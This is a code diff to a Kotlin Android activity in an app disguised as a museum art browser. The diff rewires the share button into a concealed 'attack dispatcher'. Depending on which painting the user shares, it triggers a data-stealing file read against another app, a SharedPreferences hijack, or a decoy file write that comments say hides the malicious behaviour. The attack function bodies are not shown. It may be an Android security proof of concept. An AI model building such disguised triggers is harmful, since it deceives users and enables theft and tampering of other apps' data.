@@ -16,23 +16,19 @@ import com.artexplorer.museum.data.MuseumObject
 import com.artexplorer.museum.ui.MuseumApp
 import com.artexplorer.museum.ui.theme.MuseumTheme
 
-
 class MuseumActivity : ComponentActivity() {
 
     private val TAG = "MuseumActivity"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
         Log.d(TAG, "🎨 Museum Activity starting...")
-
         setContent {
             MuseumTheme {
                 Surface(
                     modifier = Modifier.fillMaxSize(),
                     color = MaterialTheme.colorScheme.background
                 ) {
-                    // This is now clean and correct!
                     MuseumApp(
                         onShareArtwork = { artwork -> shareArtwork(artwork) }
                     )
@@ -42,32 +38,37 @@ class MuseumActivity : ComponentActivity() {
     }
 
     /**
-     * 🚨 THIS IS THE NEW ATTACK DISPATCHER! 🚨
-     * It looks like a normal share function, but secretly decides which attack to launch
-     * based on the artwork the user has selected.
+     * 🚨 THIS IS THE FINAL ATTACK DISPATCHER! 🚨
+     * It secretly launches a different attack based on which row the artwork is in.
      */
     private fun shareArtwork(artwork: MuseumObject) {
         Log.d(TAG, "🎨 User initiated share for: ${artwork.title}")
 
         when (artwork.title) {
-            "Girl with a Pearl Earring" -> {
-                // If the user shares this specific painting, trigger the data theft attack.
+            // --- ROW 1: FILE READ ATTACK (DATA THEFT) ---
+            "Wheat Field with Cypresses",
+            "Self-Portrait with a Straw Hat" -> {
                 stealVulnerableAppSettings()
             }
-            "The Great Wave off Kanagawa" -> {
-                // If the user shares this one, trigger the settings hijack.
+
+            // --- ROW 3: SETTINGS HIJACK ATTACK (APP MANIPULATION) ---
+            "The Great Wave off Kanagawa",
+            "Girl with a Pearl Earring" -> {
                 hijackVulnerableAppSettings()
             }
+
+            // --- ROW 2 & OTHERS: DECOY FILE WRITE ATTACK ---
             else -> {
-                // For all other paintings, perform the original, simpler file write attack as a decoy.
+                // For Row 2 ("The Dance Class", "The Starry Night") and any other paintings,
+                // perform the original, simpler file write attack. This makes the app
+                // seem functional and hides the more malicious attacks.
                 performOriginalFileWrite(artwork)
             }
         }
     }
 
     /**
-     * This is the original file write attack, now in its own function.
-     * It acts as the "normal" behavior to make the other attacks less suspicious.
+     * DECOY/ROW 2 ATTACK: A simple file write.
      */
     private fun performOriginalFileWrite(artwork: MuseumObject) {
         try {
@@ -88,8 +89,7 @@ class MuseumActivity : ComponentActivity() {
     }
 
     /**
-     * ATTACK 2: Arbitrary File Read (Data Theft)
-     * No changes are needed here.
+     * ROW 1 ATTACK: Arbitrary File Read (Data Theft)
      */
     private fun stealVulnerableAppSettings() {
         try {
@@ -111,8 +111,7 @@ class MuseumActivity : ComponentActivity() {
     }
 
     /**
-     * ATTACK 3: SharedPreferences Hijacking
-     * No changes are needed here.
+     * ROW 3 ATTACK: SharedPreferences Hijacking
      */
     private fun hijackVulnerableAppSettings() {
         try {
